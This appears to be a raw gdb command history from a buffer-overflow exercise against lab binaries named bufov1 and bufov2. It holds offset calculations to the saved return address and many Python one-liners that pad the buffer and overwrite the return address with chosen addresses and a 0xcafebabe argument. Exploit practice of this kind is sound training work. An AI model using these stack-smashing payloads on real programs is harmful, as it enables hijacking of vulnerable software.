break main
info break
run "AAA"
STEPI
stepi
step
step
step
step
step
step
step
step
step
step
stepi
stepi
clear main
info break
delete 1
info break
finish
break copy 
run "AAA"
p/d name
p/s name
print &name
step
step
step
print &name
p/s name
step
p/s name
step
finish
next
next
p/s name
p &name
delete 1
info break
delete 2
info break
finish
finish
run "AAA"
break main
run "AAA"
print &buf
print &buf
show disable-randomization
set disable-randomization off
show disable-randomization
print &buf
print &buf
run
print &buf
print &buf
run
print &buf
run
print &buf
set disable-randomization off
print &buf
run
print &buf
set disable-randomization on
run
print &buf
set disable-randomization on
run
print &buf
run
set disable-randomization off
run
run
print &buf
 q
start "AAA"
next
next
next
next
step
step
step
step
step
bt
info frame
p/d 0xffffd02c - 0xffffd024
p/d 0xffffd02c - 0xffffd00c
p/d 0xffffd02c - 0xffffd028
print $name
print &name
p/d 0xffffd02c - 0xffffd014
# name is located at 0xffffd014
# return address is saved at 0xffffd02c
need 24 bytes to overwrite the return address
# need 24 bytes to overwrite the return address
run "AAA" < <(python -c 'print("A" * 24)')
run "AAA" < <(python -c 'print("A" * 30)')
run "AAA" < <(python -c 'print("A" * 24)')
INFO BREAK
info break
q
q
run "AAA" < <(python -c 'print("A" * 24)')
run "AAA" < < (python -c 'print "A" * 24 + "\xf6\x91\x04\x08")
run "AAA" < <(python -c 'print "A" * 24 + "\xf6\x91\x04\x08")
run "AAA" < <(python -c 'print "A" * 24 + "\xf6\x91\x04\x08"')
run "AAA" < <(python -c 'print "A" * 24 + "\xf6\x91\x04\x08"')'
run "AAA" < <(python -c 'print "A" * 24 + "\xf6\x91\x04\x08"')'
run "AAA" < <(python -c 'print "A" * 24 + "\xf6\x91\x04\x08"')'
run "AAA" < <(python -c 'print "A" * 24 + "\xf6\x91\x04\x08"')
run "AAA" < <(python -c 'print ("A" * 24 + "\xf6\x91\x04\x08")')
run "AAA" < <(python -c 'print ("A" * 24 + "\xb6\x84\x04\x08") + "A" * 4 + "\xbe\xba\xfe\xca"')
run "AAA" < <(python -c 'print ("A" * 24 + "\xf6\x91\x04\x08") + "\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca"')
run "AAA" < <(python -c 'print ("A" * 24 + "\xb6\x84\x04\x08") + "\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca"')
run "AAA" < <(python -c 'print ("A" * 24 + "\xf6\x91\x04\x08") + "\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca")')
run "AAA" < <(python -c 'print ("A" * 24 + "\xf6\x91\x04\x08" + "\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca"))')
run "AAA" < <(python -c 'print ("A" * 24 + "\xb6\x84\x04\x08" + "\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca"')
run "AAA" < <(python -c 'print "A" * 24 + "\xb6\x84\x04\x08" + "\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca"')
run "AAA" < <(python -c 'print ("A" * 24 + "\xb6\x84\x04\x08" + "\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca")')
run "AAA" < <(python -c 'print ("A" * 24 + "\xb6\x84\x04\x08" + "\x7f\x85\x04\x08" + "\xbe\xba\xfe\xca")')
run "AAA" < <(python -c 'print ("A" * 24 + "\xb6\x84\x04\x08" + "\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca")')
run "AAA" < <(python -c 'print ("A" * 24 + "\xf6\x91\x04\x08" + "\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca")')
run "AAA" < <(python -c 'print ("A" * 24 + "\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca")')
run "AAA" < <(python -c 'print ("A" * 30 + "\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca")')
run "AAA" < <(python -c 'print ("A" * 24 + "\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca")')
info frame
run "AAA" < <(python -c 'print ("A" * 24 + "\xb6\x84\x04\x08" +"\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca")')
run "AAA" < <(python -c 'print "A" * 24 + "\xb6\x84\x04\x08" +"\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca"')
run "AAA" < <(python -c 'print("A" * 24 + "\xb6\x84\x04\x08" +"\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca")')
run "AAA" < <(python -c 'print("A" * 24 + "\xb6\x84\x04\x08" + "\xbe\xba\xfe\xca")')
run "AAA" < <(python -c 'print("A" * 24 + "\xf6\x91\x04\x08" + "\xbe\xba\xfe\xca")')
run "AAA" < <(python -c 'print("A" * 24 + "\xf6\x91\x04\x08" + "AAAA" + "\xbe\xba\xfe\xca")')
run "AAA" < <(python -c 'print "A"*17 + "\x3b\x84\x04\x08"' > payload1 ./bufov1 'cat payload')
run "AAA" < <(python -c 'print ("A"*17 + "\x3b\x84\x04\x08")' > payload1 ./bufov1 'cat payload')
run "AAA" < <(python -c 'print ("A"*22 + "\x6b\x84\x04\x08")' > payload2 cat ./payload2 - | ./bufov2)
q
